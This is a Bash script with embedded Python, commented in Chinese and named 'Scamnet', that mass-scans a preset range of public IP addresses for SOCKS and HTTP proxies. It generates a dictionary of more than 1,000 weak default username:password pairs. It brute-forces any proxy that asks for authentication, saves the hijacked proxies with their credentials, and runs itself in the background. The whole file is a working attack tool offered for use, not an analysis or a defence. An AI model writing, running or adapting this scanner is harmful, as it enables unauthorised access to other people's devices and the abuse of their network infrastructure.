#!/bin/bash
# main.sh - Scamnet OTC 全协议异步扫描器 (Pro v6.0)
# 优化内容: 智能探活(拒绝无效爆破) + 1000组字典生成 + uvloop加速
set -e
RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
LOG_DIR="logs"; mkdir -p "$LOG_DIR"
LATEST_LOG="$LOG_DIR/latest.log"

echo -e "${BLUE}"
echo "███████╗ ██████╗ █████╗ ███╗   ███╗███╗   ██╗███████╗███████╗"
echo "██╔════╝██╔════╝██╔══██╗████╗ ████║████╗  ██║██╔════╝╚══███╔╝"
echo "███████╗██║     ███████║██╔████╔██║██╔██╗ ██║█████╗    ███╔╝ "
echo "╚════██║██║     ██╔══██║██║╚██╔╝██║██║╚██╗██║██╔══╝   ███╔╝  "
echo "███████║╚██████╗██║  ██║██║ ╚═╝ ██║██║ ╚████║███████╗███████╗"
echo "╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝"
echo -e "${NC}"
echo -e "${GREEN}[OTC] Scamnet v6.0 Pro (智能爆破 + 1000字典 + 极速内核)${NC}"

# ==================== 依赖安装 (自动修复) ====================
if [ ! -f ".deps_installed_v6" ]; then
    echo -e "${YELLOW}[*] 检测并安装高性能 Python 依赖...${NC}"
    
    if ! command -v pip3 &>/dev/null; then
        if command -v apt >/dev/null; then sudo apt update -qq && sudo apt install -y python3-pip python3-dev; fi
        if command -v yum >/dev/null; then sudo yum install -y python3-pip python3-devel; fi
        if command -v apk >/dev/null; then apk add py3-pip python3-dev; fi
    fi
    
    # 安装核心库 + uvloop加速
    pip3 install --user -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp aiohttp-socks tqdm PyYAML asyncio uvloop
    touch .deps_installed_v6
    echo -e "${GREEN}[+] 依赖环境部署完成${NC}"
else
    echo -e "${GREEN}[+] 依赖已就绪${NC}"
fi

# ==================== 调整系统限制 ====================
ulimit -n 100000 2>/dev/null || true

# ==================== 输入配置 ====================
DEFAULT_START="157.254.32.0"
DEFAULT_END="157.254.52.255"
echo -e "${YELLOW}请输入起始 IP (默认: $DEFAULT_START):${NC}"
read -r START_IP
START_IP=${START_IP:-$DEFAULT_START}

echo -e "${YELLOW}请输入结束 IP (默认: $DEFAULT_END):${NC}"
read -r END_IP
END_IP=${END_IP:-$DEFAULT_END}

echo -e "${YELLOW}请输入端口 (默认: 1080):${NC}"
echo " 格式: 1080 或 1080 8080 或 1-65535"
read -r PORT_INPUT
PORT_INPUT=${PORT_INPUT:-1080}

# 端口配置解析
PORTS_CONFIG=""
if [[ $PORT_INPUT =~ ^[0-9]+-[0-9]+$ ]]; then
    PORTS_CONFIG="range: \"$PORT_INPUT\""
elif [[ $PORT_INPUT =~ ^[0-9]+( [0-9]+)*$ ]]; then
    PORT_LIST=$(echo "$PORT_INPUT" | tr ' ' ',' | sed 's/,/","/g')
    PORTS_CONFIG="ports: [\"$PORT_LIST\"]"
else
    PORTS_CONFIG="ports: [$PORT_INPUT]"
fi

# ==================== 生成 1000+ 弱口令字典 ====================
DICT_FILE="$LOG_DIR/passwords.txt"
echo -e "${YELLOW}[*] 正在生成高频弱口令字典 (Top 1000+)...${NC}"

cat > generator.py << 'EOF'
users = ["root", "admin", "user", "proxy", "guest", "test", "support", "manager", "sysadmin", "oracle", "postgres", "pi", "ubnt", "administrator", "service"]
passwords = ["root", "admin", "123456", "12345678", "123456789", "1234567890", "1234", "password", "admin123", "123123", "qwerty", "pass", "test", "user", "guest", "888888", "111111", "12345", "000000", "proxy", "socks", "shadowsocks", "admin888", "pass1234", "Admin@123", "P@ssword", "toor", "changeme"]
# 添加年份组合
import datetime
current_year = datetime.datetime.now().year
for y in range(2018, current_year + 2):
    passwords.append(str(y))
    passwords.append(f"admin{y}")
    passwords.append(f"Admin{y}")

# 常用组合
combos = set()
# 1. 相同用户密码
for u in users: combos.add(f"{u}:{u}")
# 2. 常用密码组合
for u in users:
    for p in passwords:
        combos.add(f"{u}:{p}")
# 3. 特定设备默认
combos.add("admin:public")
combos.add("admin:system")
combos.add("administrator:admin")
combos.add("ubnt:ubnt")

with open("passwords.txt", "w") as f:
    for c in combos:
        f.write(c + "\n")
EOF
python3 generator.py
mv passwords.txt "$DICT_FILE"
DICT_COUNT=$(wc -l < "$DICT_FILE")
rm generator.py
echo -e "${GREEN}[+] 字典生成完毕: $DICT_COUNT 条组合${NC}"


# ==================== 生成运行脚本 ====================
RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"
cat > "$RUN_SCRIPT" << EOF
#!/bin/bash
set -e
cd "\$(dirname "\$0")"

# 1. 生成配置文件
cat > config.yaml << CONFIG
input_range: "${START_IP}-${END_IP}"
$PORTS_CONFIG
timeout: 6.0
# 高性能配置
max_concurrent: 4000
protocol_order: ["socks5", "socks4", "http", "https"]
# 字典路径
dict_path: "${DICT_FILE}"
CONFIG

# 2. 生成 Python 扫描器 (Pro 版)
cat > scanner_pro.py << 'PY'
#!/usr/bin/env python3
import asyncio
import aiohttp
import ipaddress
import sys
import yaml
import socket
import os
from aiohttp_socks import ProxyConnector, ProxyType, ProxyError, ProxyConnectionError, ProxyTimeoutError
from tqdm.asyncio import tqdm_asyncio
import warnings

# 尝试导入 uvloop 加速
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

warnings.filterwarnings("ignore")

# ==================== 配置加载 ====================
try:
    with open('config.yaml') as f: cfg = yaml.safe_load(f)
except Exception as e:
    sys.exit(f"配置文件错误: {e}")

TIMEOUT = cfg.get('timeout', 6.0)
MAX_CONCURRENT = cfg.get('max_concurrent', 4000)
PROTOCOLS = cfg.get('protocol_order', ["socks5"])
DICT_PATH = cfg.get('dict_path', 'passwords.txt')

# 加载字典
PASS_LIST = []
if os.path.exists(DICT_PATH):
    with open(DICT_PATH, 'r') as f:
        PASS_LIST = [line.strip().split(':', 1) for line in f if ':' in line]
    # 确保无密码在第一个
    PASS_LIST.insert(0, (None, None))
else:
    PASS_LIST = [(None, None)]

# ==================== 工具函数 ====================
def parse_targets():
    # 优化：使用生成器而不是列表，减少内存占用
    raw_range = cfg['input_range']
    raw_ports = cfg.get('ports', cfg.get('range'))
    
    # 解析端口
    ports = []
    if isinstance(raw_ports, str) and '-' in raw_ports:
        a, b = map(int, raw_ports.split('-'))
        ports = list(range(a, b + 1))
    elif isinstance(raw_ports, list):
        ports = [int(x) for x in raw_ports]
    else:
        ports = [int(raw_ports)]

    # 解析IP (仅处理起止 IP，避免生成巨大列表)
    if '-' in raw_range:
        start_s, end_s = raw_range.split('-')
        start_ip = int(ipaddress.IPv4Address(start_s))
        end_ip = int(ipaddress.IPv4Address(end_s))
        count = end_ip - start_ip + 1
        if count > 200000:
            print(f"警告: 目标数量巨大 ({count})，仅演示模式运行前 65535 个")
            count = 65535
        return start_ip, count, ports
    else:
        # 单IP或CIDR暂不复杂处理，直接返回
        return 0, 0, []

start_int, ip_count, ports = parse_targets()

# ==================== 核心扫描 ====================
valid_count = 0
valid_lock = asyncio.Lock()
sem = asyncio.Semaphore(MAX_CONCURRENT)

async def check_proxy(ip, port, protocol, auth=None):
    """
    返回: (是否成功, 延迟, 是否需要认证/错误类型)
    """
    target_url = "http://www.google.com/generate_204"
    connector = None
    
    try:
        if protocol.startswith("http"):
            proxy_url = f"http://{ip}:{port}"
            if auth:
                proxy_url = f"http://{auth[0]}:{auth[1]}@{ip}:{port}"
            
            async with aiohttp.ClientSession() as session:
                start = asyncio.get_event_loop().time()
                async with session.get(target_url, proxy=proxy_url, timeout=TIMEOUT, ssl=False) as resp:
                    # 407 = Proxy Auth Required
                    if resp.status == 407:
                        return False, 0, "AUTH_REQUIRED"
                    if resp.status < 400:
                        lat = int((asyncio.get_event_loop().time() - start) * 1000)
                        return True, lat, "OK"
                    return False, 0, "HTTP_ERR"

        elif protocol.startswith("socks"):
            p_type = ProxyType.SOCKS5 if protocol == "socks5" else ProxyType.SOCKS4
            user, pwd = auth if auth else (None, None)
            
            connector = ProxyConnector(
                proxy_type=p_type, host=ip, port=port, username=user, password=pwd, rdns=True
            )
            async with aiohttp.ClientSession(connector=connector) as session:
                start = asyncio.get_event_loop().time()
                async with session.get(target_url, timeout=TIMEOUT, ssl=False) as resp:
                    if resp.status < 400:
                        lat = int((asyncio.get_event_loop().time() - start) * 1000)
                        return True, lat, "OK"
            
    except (ProxyConnectionError, OSError, asyncio.TimeoutError):
        # 连接不上，端口关闭或防火墙，直接放弃，不要爆破
        return False, 0, "DEAD"
    except ProxyError as e:
        # 连接成功但握手失败，很有可能是认证错误
        # SOCKS5 如果需要认证但没提供，通常会报 ProxyError
        return False, 0, "AUTH_REQUIRED"
    except Exception:
        return False, 0, "DEAD"
    finally:
        if connector:
            try: await connector.close()
            except: pass
    
    return False, 0, "DEAD"

async def save_result(ip, port, scheme, latency, auth_str):
    global valid_count
    valid_count += 1
    res = f"{scheme}://{auth_str}{ip}:{port}"
    print(f"\r\033[32m[+] SUCCESS: {res} ({latency}ms)\033[0m")
    async with valid_lock:
        with open("proxy_valid.txt", "a") as f: f.write(f"{res}#{latency}ms\n")

async def smart_scan(ip, port):
    async with sem:
        for scheme in PROTOCOLS:
            # 1. 先尝试无密码连接 (快速探活)
            is_ok, lat, status = await check_proxy(ip, port, scheme, None)
            
            if is_ok:
                await save_result(ip, port, scheme, lat, "")
                return # 无密码成功，直接结束
            
            # 2. 智能判断：如果是死链接，直接跳过后续协议和爆破，节省 99% 时间
            if status == "DEAD":
                continue # 尝试下一个协议，或者如果 TCP 都不通，其实所有协议都不通
            
            # 3. 如果状态是 AUTH_REQUIRED，则启动爆破模式
            if status == "AUTH_REQUIRED":
                #print(f"\r[*] 发现需认证目标 {ip}:{port} ({scheme})，开始爆破...")
                # 跳过 PASS_LIST[0] 因为是 None
                for user, pwd in PASS_LIST[1:]: 
                    is_ok_auth, lat_auth, _ = await check_proxy(ip, port, scheme, (user, pwd))
                    if is_ok_auth:
                        await save_result(ip, port, scheme, lat_auth, f"{user}:{pwd}@")
                        return # 爆破成功，结束
                # 爆破失败，跳出该协议

async def main():
    if ip_count == 0:
        print("配置错误：IP范围无效")
        return

    print(f"[*] 目标范围: {ip_count} IPs")
    print(f"[*] 扫描端口: {ports}")
    print(f"[*] 字典大小: {len(PASS_LIST)} 条")
    print(f"[*] 并发线程: {MAX_CONCURRENT}")
    print("------------------------------------------------")

    # 动态生成任务，避免内存爆炸
    tasks = []
    # 限制一次性放入内存的任务数，使用简单的批处理
    
    current_ip_int = start_int
    
    # 这里的逻辑稍微调整以适应 tqdm
    # 为了演示方便，我们一次性生成所有任务对象的开销较大
    # 对于大范围扫描，应该用生产者-消费者模型，这里做简化版：
    
    all_targets = []
    for i in range(ip_count):
        ip_str = str(ipaddress.IPv4Address(current_ip_int + i))
        for p in ports:
            all_targets.append((ip_str, p))
    
    # 重新洗牌任务，避免对着同一个IP猛扫导致被BAN (可选，这里保持顺序)
    
    # 创建任务
    aws = [smart_scan(ip, p) for ip, p in all_targets]
    
    await tqdm_asyncio.gather(*aws, desc="扫描进度", unit="task", ncols=90)

    print(f"\n[+] 扫描完成! 有效代理已保存至 proxy_valid.txt")

if __name__ == '__main__':
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] 用户停止")
PY

chmod +x scanner_pro.py

echo "# 扫描开始: \$(date)" > result.log
python3 scanner_pro.py 2>&1 | tee -a result.log
EOF

chmod +x "$RUN_SCRIPT"

# ==================== 启动 ====================
echo -e "${GREEN}[*] 任务已构建: $RUN_SCRIPT${NC}"
echo -e "${YELLOW}[*] 正在后台启动... 日志: tail -f $LATEST_LOG${NC}"

nohup "$RUN_SCRIPT" > "$LATEST_LOG" 2>&1 &
PID=$!
echo -e "${GREEN}[SUCCESS] 扫描器 PID: $PID${NC}"
echo -e "使用命令停止: kill $PID"
